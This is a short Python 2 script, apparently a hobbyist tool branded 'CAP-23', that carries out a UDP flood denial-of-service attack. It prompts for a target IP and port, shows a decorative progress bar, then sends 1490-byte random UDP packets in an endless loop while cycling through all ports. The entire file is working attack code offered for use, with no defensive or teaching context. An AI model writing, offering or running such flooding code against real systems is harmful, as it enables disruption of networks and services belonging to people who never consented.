#!/usr/bin/python
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#### DDOS #####
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###### XD ######

os.system("clear")
print "\033[36m"
os.system("figlet CAP-23")
print ""
print "\033[33m[\033[31m*\033[33m] \033[35m Create by:\033[32m Capricornio23"
print "\033[33m[\033[31m*\033[33m] \033[35m YouTube:\033[32m https://youtube.com/channel/UC5yJUf5jl0QOouWsvOFO4wQ"
print "\033[33m[\033[31m*\033[33m] \033[35m My Github:\033[32m https://github.com/Capricornio23"
print "\033[33m[\033[31m*\033[33m] \033[35m Facebook:\033[32m https://www.facebook.com/benyamin.beckam"
print ""
ip = raw_input("\033[32m[\033[31m$\033[32m] \033[33mIP Target : ")
port = input("\033[32m[\033[31m$\033[32m] \033[33mPort : ")

os.system("clear")
print "\033[33m"
os.system("figlet STARTING ")
os.system("figlet ATTACK")
print "\033[31m"
print "[                    ] 0% "
time.sleep(5)
print "[.....               ] 25%"
time.sleep(5)
print "[..........          ] 50%"
time.sleep(5)
print "[...............     ] 75%"
time.sleep(5)
print "[....................] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
